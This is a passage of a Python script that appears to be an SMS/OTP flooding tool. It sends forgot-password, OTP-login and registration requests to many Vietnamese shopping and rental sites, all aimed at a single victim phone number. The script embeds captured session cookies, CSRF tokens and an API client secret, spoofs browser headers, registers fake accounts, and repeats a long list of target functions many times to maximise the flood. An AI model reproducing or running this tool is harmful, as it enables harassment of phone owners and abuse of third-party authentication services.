        'PrestaShop-7cbf831598fa6791cd6d07d5b5873d26': 'def5020068bc9968a1f8eaaf0c1d13a95cc8f785bc1e80ef97d2381149d44416b718ea0e1ec703548d1e2c36c17c2fc7bb621176cc5144ba9afbd8e52ab34e62676287139a492a5fb1df85974c1d817955c9dbd66fb0048b6d55396eb82141cd0082257db6f741e461e897ac3bab90f3da71886e4b0a4c48699290185853153f52531995e21cea01e5f336ee0b4f2be6b6eb24eab82935a13898ef71d00e23f59018d4a57353e0ed77c1d620ca46aa302c8dee2b3b4befd342b1db81d32f88c89cc27c55af97e559e6c67e0fc37871bb29cdedb3f218d114857262c878fb3cc1d18c81bb76981cbbc5b2c4f9598485b794288ecc2a4c5f7ad27f78838b5b898f137721fef9c7625ee410bd91cbe2ae87d3a0e2700c5bff120321beec50628206',
        'jpresta_cache_context': 'e67fa49f-162d-11ee-9cf4-0692000019e5',
        'PrestaShop-03bfe1c20f5691800e1f882876466fe7': 'def502004244d73ba44dfc4e9f94dfa641d33aa71985561b821acd2d8a87e724e19921f344cb9602cba1c49d99a5e60c05d71d9022fe3ecb2c8832b6bf3deb69101ae3e8872ff32d28a90f0687bd88bd84ca74216d1e312c2a43f84130230fff88fcc2289870ac6445e93d49ce1bb2bc14b780a65adfea4923c5e9e5a8eb4fde527ca1692bb6e01c850b86614cddd69e138438283f8230e315366ede432762e712bf75a18fd0c078028c11dbeeb8e0813a23608919ec47e413cdc60d0da1cea2cd3f327402ce72e7db4fb60d77d2f7096b6fb0b4bdfc015e4d374f3b143d11c5c5d15b17093c695393ccf24bc6122ec7e960e25b94187f73735c06eb0b71e16d333dd26ea6f24904b4a46e4558359cd94743',
    }

    headers = {
        'accept': 'application/json, text/javascript, */*; q=0.01',
        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        # 'cookie': '_qg_fts=1721578581; QGUserId=1896938940101377; _qg_pushrequest=true; _qg_cm=1; PHPSESSID=d6e6f38ea2j2tf3m264h26599v; jpresta_cache_source_6666cd76f96956469e7be39d750cc7d9=2; PrestaShop-7cbf831598fa6791cd6d07d5b5873d26=def5020068bc9968a1f8eaaf0c1d13a95cc8f785bc1e80ef97d2381149d44416b718ea0e1ec703548d1e2c36c17c2fc7bb621176cc5144ba9afbd8e52ab34e62676287139a492a5fb1df85974c1d817955c9dbd66fb0048b6d55396eb82141cd0082257db6f741e461e897ac3bab90f3da71886e4b0a4c48699290185853153f52531995e21cea01e5f336ee0b4f2be6b6eb24eab82935a13898ef71d00e23f59018d4a57353e0ed77c1d620ca46aa302c8dee2b3b4befd342b1db81d32f88c89cc27c55af97e559e6c67e0fc37871bb29cdedb3f218d114857262c878fb3cc1d18c81bb76981cbbc5b2c4f9598485b794288ecc2a4c5f7ad27f78838b5b898f137721fef9c7625ee410bd91cbe2ae87d3a0e2700c5bff120321beec50628206; jpresta_cache_context=e67fa49f-162d-11ee-9cf4-0692000019e5; PrestaShop-03bfe1c20f5691800e1f882876466fe7=def502004244d73ba44dfc4e9f94dfa641d33aa71985561b821acd2d8a87e724e19921f344cb9602cba1c49d99a5e60c05d71d9022fe3ecb2c8832b6bf3deb69101ae3e8872ff32d28a90f0687bd88bd84ca74216d1e312c2a43f84130230fff88fcc2289870ac6445e93d49ce1bb2bc14b780a65adfea4923c5e9e5a8eb4fde527ca1692bb6e01c850b86614cddd69e138438283f8230e315366ede432762e712bf75a18fd0c078028c11dbeeb8e0813a23608919ec47e413cdc60d0da1cea2cd3f327402ce72e7db4fb60d77d2f7096b6fb0b4bdfc015e4d374f3b143d11c5c5d15b17093c695393ccf24bc6122ec7e960e25b94187f73735c06eb0b71e16d333dd26ea6f24904b4a46e4558359cd94743',
        'origin': 'https://www.kkfashion.vn',
        'priority': 'u=1, i',
        'referer': 'https://www.kkfashion.vn/khoi-phuc-mat-khau',
        'sec-ch-ua': '"Chromium";v="128", "Not;A=Brand";v="24", "Opera";v="114"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36 OPR/114.0.0.0',
        'x-requested-with': 'XMLHttpRequest',
    }

    data = {
        'phone': sdt,
        'otpcode': '',
    }

    try:
        response = requests.post('https://www.kkfashion.vn/module/nj_sms/forgotPassword', cookies=cookies, headers=headers, data=data)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("KKFASHION | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("KKFASHION | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def galle():
    cookies = {
        'PHPSESSID': '3kv776kuerno81s5lcsnbd9tqm',
        'products': '%5B%5D',
        '_pk_ref.113.7b3e': '%5B%22%22%2C%22%22%2C1731822742%2C%22https%3A%2F%2Fwww.google.com%2F%22%5D',
        '_pk_ses.113.7b3e': '1',
        '__sbref': 'ukgqbndecdfsiwmeotamanjncqdufkdsljtusbjt',
        'mautic_focus_7': '1731822752',
        '_pk_id.113.7b3e': '9ce50c41e4f05f36.1731822742.1.1731822805.1731822742.',
    }

    headers = {
        'accept': 'application/json, text/javascript, */*; q=0.01',
        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        # 'cookie': 'PHPSESSID=3kv776kuerno81s5lcsnbd9tqm; products=%5B%5D; _pk_ref.113.7b3e=%5B%22%22%2C%22%22%2C1731822742%2C%22https%3A%2F%2Fwww.google.com%2F%22%5D; _pk_ses.113.7b3e=1; __sbref=ukgqbndecdfsiwmeotamanjncqdufkdsljtusbjt; mautic_focus_7=1731822752; _pk_id.113.7b3e=9ce50c41e4f05f36.1731822742.1.1731822805.1731822742.',
        'origin': 'https://galle.vn',
        'priority': 'u=1, i',
        'referer': 'https://galle.vn/?srsltid=AfmBOopRdqA6Af605qrb49rkHDNL1LO5yje5bMhcFQuFDmuwA2pyx2lO',
        'sec-ch-ua': '"Chromium";v="128", "Not;A=Brand";v="24", "Opera";v="114"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36 OPR/114.0.0.0',
        'x-requested-with': 'XMLHttpRequest',
    }

    params = {
        'module': 'users',
        'view': 'users',
        'task': 'ajax_login_phone',
        'raw': '1',
    }

    data = {
        'phone': '{0} {1} {2}'.format(sdt[0:4], sdt[4:7], sdt[7:10]),
    }

    try:
        response = requests.post('https://galle.vn/index.php', params=params, cookies=cookies, headers=headers, data=data)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("GALLE | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("GALLE | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def minhshop():
    headers = {
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://minhshop.vn',
        'priority': 'u=1, i',
        'referer': 'https://minhshop.vn/',
        'sec-ch-ua': '"Chromium";v="128", "Not;A=Brand";v="24", "Opera";v="114"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'cross-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36 OPR/114.0.0.0',
    }

    data = {
        'client_id': '15ff27eec55449e291e1a8529f92aec7',
        'client_secret': '226fcf9c1cd248dc86a9d7d8cc174368',
        'scope': 'api',
        'tenant-id': '45A26BFC-F2B2-4CA2-AB49-9EE8E9ADCFEC',
        'grant_type': 'phone',
        'phone': sdt,
    }

    try:
        response = requests.post('https://auth.k.storims.com/connect/token', headers=headers, data=data)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("MINHSHOP | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("MINHSHOP | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def formartvn():
    cookies = {
        '_landing_page': '%252Fcollections%252Fthoi-trang-nu%253Fsrsltid%253DAfmBOor77mykGuazn7hHP3DtyW-ABjg0BSQIbdpBaTZMtsXo-CGWIHhW',
        '_orig_referer': 'https%253A%252F%252Fwww.google.com%252F',
        'shop_ref': '',
        'internal': 'y',
        'form_key': 'AmLZVtns8uQe6dRE',
        'mage-cache-storage': '{}',
        'mage-cache-storage-section-invalidation': '{}',
        'recently_viewed_product': '{}',
        'recently_viewed_product_previous': '{}',
        'recently_compared_product': '{}',
        'recently_compared_product_previous': '{}',
        'product_data_storage': '{}',
        'mage-messages': '',
        'PHPSESSID': '2d4j3m8gpb632nfo51bkdd157b',
        'form_key': 'AmLZVtns8uQe6dRE',
        'mage-cache-sessid': 'true',
        'store_login_with_line_cookie': 'rEr1C0',
    }

    headers = {
        'accept': 'application/json, text/javascript, */*; q=0.01',
        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        # 'cookie': '_landing_page=%252Fcollections%252Fthoi-trang-nu%253Fsrsltid%253DAfmBOor77mykGuazn7hHP3DtyW-ABjg0BSQIbdpBaTZMtsXo-CGWIHhW; _orig_referer=https%253A%252F%252Fwww.google.com%252F; shop_ref=; internal=y; form_key=AmLZVtns8uQe6dRE; mage-cache-storage={}; mage-cache-storage-section-invalidation={}; recently_viewed_product={}; recently_viewed_product_previous={}; recently_compared_product={}; recently_compared_product_previous={}; product_data_storage={}; mage-messages=; PHPSESSID=2d4j3m8gpb632nfo51bkdd157b; form_key=AmLZVtns8uQe6dRE; mage-cache-sessid=true; store_login_with_line_cookie=rEr1C0',
        'priority': 'u=1, i',
        'referer': 'https://format.com.vn/customer/account/create/',
        'sec-ch-ua': '"Chromium";v="128", "Not;A=Brand";v="24", "Opera";v="114"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36 OPR/114.0.0.0',
        'x-requested-with': 'XMLHttpRequest',
    }

    params = {
        'telephone': sdt,
        'action_type': '1',
        '_': '1731841093569',
    }

    try:
        response = requests.get('https://format.com.vn/advancedlogin/otp/sendOtp', params=params, cookies=cookies, headers=headers)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("FORMAT.VN | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("FORMAT.VN | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def thuecanho1232():
    cookies = {
        'XSRF-TOKEN': 'eyJpdiI6InljSi9Qa2hrSGJZN1JKWXhGRHdQRHc9PSIsInZhbHVlIjoiZ3I5Vkl5VWVRa3JSR2ZVMmpHUlpmL3EwblRzM1NVYmZRSlZyNU1UQ1RlRnNRcG43anVEQ2k5WVE3U3JIWmlkM3dlNHo0TEd2TVBodVRQcFNsV1RNYXQwbGFDSllYTEdSaDFHRCtVUENjSloxNkNFMGZCYVNuRldSb2FCcTJ3K1MiLCJtYWMiOiJmMDQzMDM1MmIyZTkzYWVjYWQ0ODc3NDExMWI5NTg3OGQ5NTJmOTdiZTExNDM3MTQ3MzZkZjI2MTViMWMyM2IyIiwidGFnIjoiIn0%3D',
        'bds123_session': 'mQP2QFVqqsbagk6uPidb9S84xsal8D5xahuAaRtv',
    }

    headers = {
        'accept': 'application/json, text/javascript, */*; q=0.01',
        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        # 'cookie': 'XSRF-TOKEN=eyJpdiI6InljSi9Qa2hrSGJZN1JKWXhGRHdQRHc9PSIsInZhbHVlIjoiZ3I5Vkl5VWVRa3JSR2ZVMmpHUlpmL3EwblRzM1NVYmZRSlZyNU1UQ1RlRnNRcG43anVEQ2k5WVE3U3JIWmlkM3dlNHo0TEd2TVBodVRQcFNsV1RNYXQwbGFDSllYTEdSaDFHRCtVUENjSloxNkNFMGZCYVNuRldSb2FCcTJ3K1MiLCJtYWMiOiJmMDQzMDM1MmIyZTkzYWVjYWQ0ODc3NDExMWI5NTg3OGQ5NTJmOTdiZTExNDM3MTQ3MzZkZjI2MTViMWMyM2IyIiwidGFnIjoiIn0%3D; bds123_session=mQP2QFVqqsbagk6uPidb9S84xsal8D5xahuAaRtv',
        'origin': 'https://thuecanho123.com',
        'priority': 'u=1, i',
        'referer': 'https://thuecanho123.com/dang-ky.html',
        'sec-ch-ua': '"Chromium";v="128", "Not;A=Brand";v="24", "Opera";v="114"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36 OPR/114.0.0.0',
        'x-csrf-token': 'mNPC1k4l20XU3XaDaZ1PanuXLBSww0uhonPAEsqW',
        'x-requested-with': 'XMLHttpRequest',
    }

    data = {
        'fullname': 'tran quoc huuh',
        'phone': sdt,
        'password': '123123aA@',
        'user_type': '1',
    }

    response = requests.post('https://thuecanho123.com/api/user/register', cookies=cookies, headers=headers, data=data, verify=False)

    cookies = {
        'XSRF-TOKEN': 'eyJpdiI6IjlJOGt1bVZKZTZPdDR4OU01MUJyS1E9PSIsInZhbHVlIjoiWkFrOUd3ZVRSV001aDhHNEUxSDMrZzlpcEpOZFIxQ3UvNDY3c2V0SitvdnZsTy9jMWdoVmp6TlZqOFk1aUVoMXg5alBKM2NWcGU2dCtNNlozN2pvRmduMzhkMUEvUThFZFJkSm84bVc1cmNiWW5IclplZnR4OHBla0JBbFd0R1AiLCJtYWMiOiI1MzA1YmQ0MTZlNWQwODY1NGFjZjEzZjM1MTNlNDdhOTI2NTVkMzFhZWU1Y2FkMjBiMjVmMTU1YzJlYjRiMTYwIiwidGFnIjoiIn0%3D',
        'bds123_session': '4SbgDERk3VETc1Py5bVIMZfMWesuwPU1qNYFZPVF',
    }

    headers = {
        'accept': 'application/json, text/javascript, */*; q=0.01',
        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        # 'cookie': 'XSRF-TOKEN=eyJpdiI6IjlJOGt1bVZKZTZPdDR4OU01MUJyS1E9PSIsInZhbHVlIjoiWkFrOUd3ZVRSV001aDhHNEUxSDMrZzlpcEpOZFIxQ3UvNDY3c2V0SitvdnZsTy9jMWdoVmp6TlZqOFk1aUVoMXg5alBKM2NWcGU2dCtNNlozN2pvRmduMzhkMUEvUThFZFJkSm84bVc1cmNiWW5IclplZnR4OHBla0JBbFd0R1AiLCJtYWMiOiI1MzA1YmQ0MTZlNWQwODY1NGFjZjEzZjM1MTNlNDdhOTI2NTVkMzFhZWU1Y2FkMjBiMjVmMTU1YzJlYjRiMTYwIiwidGFnIjoiIn0%3D; bds123_session=4SbgDERk3VETc1Py5bVIMZfMWesuwPU1qNYFZPVF',
        'origin': 'https://thuecanho123.com',
        'priority': 'u=1, i',
        'referer': 'https://thuecanho123.com/quen-mat-khau.html',
        'sec-ch-ua': '"Chromium";v="128", "Not;A=Brand";v="24", "Opera";v="114"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36 OPR/114.0.0.0',
        'x-csrf-token': 'eWFk4KXiuuacv2uEdpTnizciSYHcKgREHh8ly7a3',
        'x-requested-with': 'XMLHttpRequest',
    }

    data = {
        'phone_or_email': sdt,
        'action': 'forget_password',
    }

    try:
        response = requests.post('https://thuecanho123.com/api/user/send-token', cookies=cookies, headers=headers, data=data, verify=False)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("THUENHA22SMS | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("THUENHA22SMS | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

functions = [
    tv360, beautybox, xanhsmzl, galaxyplay, myviettel, fptshop, sapo, reebok, shine,
    vieon,thefaceshop, bestexpress, oreka, acfc, pantio, winny, befood,
    myviettel, fptshop, sapo, reebok, shine, hasaki, emart, ahamove, fahasa, sablanca,
    foodhubzl, pantioresend, vttelecom, vinwonders, vietair,
    mioto, pharmartsms, medigosms, avakids, medigozl,
    pharmartzl, ddmevabe, ghtkreg, pcspostreg, liena, gofood, pasgo, vietloan,
    mocha, sigo, mamanbebe, tatmart, hacom, xanhsmreg,
    viettelpost, ghtk, pcspost, vsports, mrtho,
    vuihoc, mainguyen, phongtro123, chothuephongtro, bds123, vnsc,
    bibomart, sbiz, thieuhoa, goldenspoonszl, dchic, guardian, hoangphuc, trungsoncaresms,
    leflair, vayvnd, bibabo, mocha35, xanhsm2, foodmapzl, lixibox, boshop, sapporopremiumbeer,
    innisfree, goldenspoonssms, aeoneshop, chothuenha, gas24h,
    goldenspoonssmsresend, zl188, thuecanho123, goldenspoonszlresend,
    alothuocsi, alothuocsi2, foodmapsms, trungsoncarezl, jollibee, beautyfull,
    kkfashion, galle, minhshop, formartvn, ddmevabe, ghtkreg, pcspostreg, liena, gofood, pasgo, vietloan,
    mocha, sigo, mamanbebe, tatmart, hacom, xanhsmreg,
    viettelpost, ghtk, pcspost, vsports, mrtho,
    vuihoc, mainguyen, phongtro123, chothuephongtro, bds123, vnsc,
    bibomart, sbiz, thieuhoa, goldenspoonszl, dchic, guardian, hoangphuc, trungsoncaresms,
    leflair, vayvnd, bibabo, mocha35, xanhsm2, foodmapzl, lixibox, boshop, sapporopremiumbeer,
    innisfree, goldenspoonssms, aeoneshop, chothuenha, gas24h,
    goldenspoonssmsresend, zl188, thuecanho123, goldenspoonszlresend,
    alothuocsi, alothuocsi2, foodmapsms, trungsoncarezl, jollibee, beautyfull,
    kkfashion, galle, minhshop, formartvn, tv360, beautybox, xanhsmzl, galaxyplay, myviettel, fptshop, sapo, reebok, shine,
    vieon,thefaceshop, bestexpress, oreka, acfc, pantio, winny, befood,
    myviettel, fptshop, sapo, reebok, shine, hasaki, emart, ahamove, fahasa, sablanca,
    foodhubzl, pantioresend, vttelecom, vinwonders, vietair,
    mioto, pharmartsms, medigosms, avakids, medigozl,
    pharmartzl, ddmevabe, ghtkreg, pcspostreg, liena, gofood, pasgo, vietloan,
    mocha, sigo, mamanbebe, tatmart, hacom, xanhsmreg,
    viettelpost, ghtk, pcspost, vsports, mrtho,
    vuihoc, mainguyen, phongtro123, chothuephongtro, bds123, vnsc,
    bibomart, sbiz, thieuhoa, goldenspoonszl, dchic, guardian, hoangphuc, trungsoncaresms,
    leflair, vayvnd, bibabo, mocha35, xanhsm2, foodmapzl, lixibox, boshop, sapporopremiumbeer,
    innisfree, goldenspoonssms, aeoneshop, chothuenha, gas24h,
    goldenspoonssmsresend, zl188, thuecanho123, goldenspoonszlresend,
    alothuocsi, alothuocsi2, foodmapsms, trungsoncarezl, jollibee, beautyfull,
    kkfashion, galle, minhshop, formartvn, ddmevabe, ghtkreg, pcspostreg, liena, gofood, pasgo, vietloan,
    mocha, sigo, mamanbebe, tatmart, hacom, xanhsmreg,
    viettelpost, ghtk, pcspost, vsports, mrtho,
    vuihoc, mainguyen, phongtro123, chothuephongtro, bds123, vnsc,
    bibomart, sbiz, thieuhoa, goldenspoonszl, dchic, guardian, hoangphuc, trungsoncaresms,
    leflair, vayvnd, bibabo, mocha35, xanhsm2, foodmapzl, lixibox, boshop, sapporopremiumbeer,
    innisfree, goldenspoonssms, aeoneshop, chothuenha, gas24h,
    goldenspoonssmsresend, zl188, thuecanho123, goldenspoonszlresend,
    alothuocsi, alothuocsi2, foodmapsms, trungsoncarezl, jollibee, beautyfull,
    kkfashion, galle, minhshop, formartvn,tv360, beautybox, xanhsmzl, galaxyplay, myviettel, fptshop, sapo, reebok, shine,
    vieon,thefaceshop, bestexpress, oreka, acfc, pantio, winny, befood,
    myviettel, fptshop, sapo, reebok, shine, hasaki, emart, ahamove, fahasa, sablanca,
    foodhubzl, pantioresend, vttelecom, vinwonders, vietair,
    mioto, pharmartsms, medigosms, avakids, medigozl,
    pharmartzl, ddmevabe, ghtkreg, pcspostreg, liena, gofood, pasgo, vietloan,
    mocha, sigo, mamanbebe, tatmart, hacom, xanhsmreg,
    viettelpost, ghtk, pcspost, vsports, mrtho,
    vuihoc, mainguyen, phongtro123, chothuephongtro, bds123, vnsc,
    bibomart, sbiz, thieuhoa, goldenspoonszl, dchic, guardian, hoangphuc, trungsoncaresms,
    leflair, vayvnd, bibabo, mocha35, xanhsm2, foodmapzl, lixibox, boshop, sapporopremiumbeer,
    innisfree, goldenspoonssms, aeoneshop, chothuenha, gas24h,
    goldenspoonssmsresend, zl188, thuecanho123, goldenspoonszlresend,
    alothuocsi, alothuocsi2, foodmapsms, trungsoncarezl, jollibee, beautyfull,
    kkfashion, galle, minhshop, formartvn, ddmevabe, ghtkreg, pcspostreg, liena, gofood, pasgo, vietloan,
    mocha, sigo, mamanbebe, tatmart, hacom, xanhsmreg,
    viettelpost, ghtk, pcspost, vsports, mrtho,
    vuihoc, mainguyen, phongtro123, chothuephongtro, bds123, vnsc,
    bibomart, sbiz, thieuhoa, goldenspoonszl, dchic, guardian, hoangphuc, trungsoncaresms,
    leflair, vayvnd, bibabo, mocha35, xanhsm2, foodmapzl, lixibox, boshop, sapporopremiumbeer,
    innisfree, goldenspoonssms, aeoneshop, chothuenha, gas24h,
    goldenspoonssmsresend, zl188, thuecanho123, goldenspoonszlresend,
    alothuocsi, alothuocsi2, foodmapsms, trungsoncarezl, jollibee, beautyfull,
    kkfashion, galle, minhshop, formartvn,tv360, beautybox, xanhsmzl, galaxyplay, myviettel, fptshop, sapo, reebok, shine,
    vieon,thefaceshop, bestexpress, oreka, acfc, pantio, winny, befood,
    myviettel, fptshop, sapo, reebok, shine, hasaki, emart, ahamove, fahasa, sablanca,
    foodhubzl, pantioresend, vttelecom, vinwonders, vietair,
    mioto, pharmartsms, medigosms, avakids, medigozl,
    pharmartzl, ddmevabe, ghtkreg, pcspostreg, liena, gofood, pasgo, vietloan,
    mocha, sigo, mamanbebe, tatmart, hacom, xanhsmreg,
    viettelpost, ghtk, pcspost, vsports, mrtho,
    vuihoc, mainguyen, phongtro123, chothuephongtro, bds123, vnsc,
    bibomart, sbiz, thieuhoa, goldenspoonszl, dchic, guardian, hoangphuc, trungsoncaresms,
    leflair, vayvnd, bibabo, mocha35, xanhsm2, foodmapzl, lixibox, boshop, sapporopremiumbeer,
    innisfree, goldenspoonssms, aeoneshop, chothuenha, gas24h,
    goldenspoonssmsresend, zl188, thuecanho123, goldenspoonszlresend,
    alothuocsi, alothuocsi2, foodmapsms, trungsoncarezl, jollibee, beautyfull,
    kkfashion, galle, minhshop, formartvn, ddmevabe, ghtkreg, pcspostreg, liena, gofood, pasgo, vietloan,
    mocha, sigo, mamanbebe, tatmart, hacom, xanhsmreg,
    viettelpost, ghtk, pcspost, vsports, mrtho,
    vuihoc, mainguyen, phongtro123, chothuephongtro, bds123, vnsc,
    bibomart, sbiz, thieuhoa, goldenspoonszl, dchic, guardian, hoangphuc, trungsoncaresms,
    leflair, vayvnd, bibabo, mocha35, xanhsm2, foodmapzl, lixibox, boshop, sapporopremiumbeer,
    innisfree, goldenspoonssms, aeoneshop, chothuenha, gas24h,
    goldenspoonssmsresend, zl188, thuecanho123, goldenspoonszlresend,
    alothuocsi, alothuocsi2, foodmapsms, trungsoncarezl, jollibee, beautyfull,
    kkfashion, galle, minhshop, formartvn,tv360, beautybox, xanhsmzl, galaxyplay, myviettel, fptshop, sapo, reebok, shine,
    vieon,thefaceshop, bestexpress, oreka, acfc, pantio, winny, befood,
    myviettel, fptshop, sapo, reebok, shine, hasaki, emart, ahamove, fahasa, sablanca,
    foodhubzl, pantioresend, vttelecom, vinwonders, vietair,
    mioto, pharmartsms, medigosms, avakids, medigozl,
    pharmartzl, ddmevabe, ghtkreg, pcspostreg, liena, gofood, pasgo, vietloan,
    mocha, sigo, mamanbebe, tatmart, hacom, xanhsmreg,
    viettelpost, ghtk, pcspost, vsports, mrtho,
    vuihoc, mainguyen, phongtro123, chothuephongtro, bds123, vnsc,
    bibomart, sbiz, thieuhoa, goldenspoonszl, dchic, guardian, hoangphuc, trungsoncaresms,
    leflair, vayvnd, bibabo, mocha35, xanhsm2, foodmapzl, lixibox, boshop, sapporopremiumbeer,
    innisfree, goldenspoonssms, aeoneshop, chothuenha, gas24h,
    goldenspoonssmsresend, zl188, thuecanho123, goldenspoonszlresend,
    alothuocsi, alothuocsi2, foodmapsms, trungsoncarezl, jollibee, beautyfull,
    kkfashion, galle, minhshop, formartvn, ddmevabe, ghtkreg, pcspostreg, liena, gofood, pasgo, vietloan,
    mocha, sigo, mamanbebe, tatmart, hacom, xanhsmreg,
    viettelpost, ghtk, pcspost, vsports, mrtho,
    vuihoc, mainguyen, phongtro123, chothuephongtro, bds123, vnsc,
    bibomart, sbiz, thieuhoa, goldenspoonszl, dchic, guardian, hoangphuc, trungsoncaresms,
    leflair, vayvnd, bibabo, mocha35, xanhsm2, foodmapzl, lixibox, boshop, sapporopremiumbeer,
    innisfree, goldenspoonssms, aeoneshop, chothuenha, gas24h,
    goldenspoonssmsresend, zl188, thuecanho123, goldenspoonszlresend,
    alothuocsi, alothuocsi2, foodmapsms, trungsoncarezl, jollibee, beautyfull,
    kkfashion, galle, minhshop, formartvn,tv360, beautybox, xanhsmzl, galaxyplay, myviettel, fptshop, sapo, reebok, shine,
    vieon,thefaceshop, bestexpress, oreka, acfc, pantio, winny, befood,
    myviettel, fptshop, sapo, reebok, shine, hasaki, emart, ahamove, fahasa, sablanca,
    foodhubzl, pantioresend, vttelecom, vinwonders, vietair,
    mioto, pharmartsms, medigosms, avakids, medigozl,
    pharmartzl, ddmevabe, ghtkreg, pcspostreg, liena, gofood, pasgo, vietloan,
    mocha, sigo, mamanbebe, tatmart, hacom, xanhsmreg,
    viettelpost, ghtk, pcspost, vsports, mrtho,
    vuihoc, mainguyen, phongtro123, chothuephongtro, bds123, vnsc,
    bibomart, sbiz, thieuhoa, goldenspoonszl, dchic, guardian, hoangphuc, trungsoncaresms,
    leflair, vayvnd, bibabo, mocha35, xanhsm2, foodmapzl, lixibox, boshop, sapporopremiumbeer,
    innisfree, goldenspoonssms, aeoneshop, chothuenha, gas24h,
    goldenspoonssmsresend, zl188, thuecanho123, goldenspoonszlresend,
    alothuocsi, alothuocsi2, foodmapsms, trungsoncarezl, jollibee, beautyfull,
    kkfashion, galle, minhshop, formartvn, ddmevabe, ghtkreg, pcspostreg, liena, gofood, pasgo, vietloan,
    mocha, sigo, mamanbebe, tatmart, hacom, xanhsmreg,
    viettelpost, ghtk, pcspost, vsports, mrtho,
    vuihoc, mainguyen, phongtro123, chothuephongtro, bds123, vnsc,
    bibomart, sbiz, thieuhoa, goldenspoonszl, dchic, guardian, hoangphuc, trungsoncaresms,
    leflair, vayvnd, bibabo, mocha35, xanhsm2, foodmapzl, lixibox, boshop, sapporopremiumbeer,
    innisfree, goldenspoonssms, aeoneshop, chothuenha, gas24h,
    goldenspoonssmsresend, zl188, thuecanho123, goldenspoonszlresend,
    alothuocsi, alothuocsi2, foodmapsms, trungsoncarezl, jollibee, beautyfull,
    kkfashion, galle, minhshop, formartvn,tv360, beautybox, xanhsmzl, galaxyplay, myviettel, fptshop, sapo, reebok, shine,
    vieon,thefaceshop, bestexpress, oreka, acfc, pantio, winny, befood,
    myviettel, fptshop, sapo, reebok, shine, hasaki, emart, ahamove, fahasa, sablanca,
    foodhubzl, pantioresend, vttelecom, vinwonders, vietair,
    mioto, pharmartsms, medigosms, avakids, medigozl,
    pharmartzl, ddmevabe, ghtkreg, pcspostreg, liena, gofood, pasgo, vietloan,
    mocha, sigo, mamanbebe, tatmart, hacom, xanhsmreg,
    viettelpost, ghtk, pcspost, vsports, mrtho,
    vuihoc, mainguyen, phongtro123, chothuephongtro, bds123, vnsc,
    bibomart, sbiz, thieuhoa, goldenspoonszl, dchic, guardian, hoangphuc, trungsoncaresms,
    leflair, vayvnd, bibabo, mocha35, xanhsm2, foodmapzl, lixibox, boshop, sapporopremiumbeer,
    innisfree, goldenspoonssms, aeoneshop, chothuenha, gas24h,
    goldenspoonssmsresend, zl188, thuecanho123, goldenspoonszlresend,
    alothuocsi, alothuocsi2, foodmapsms, trungsoncarezl, jollibee, beautyfull,
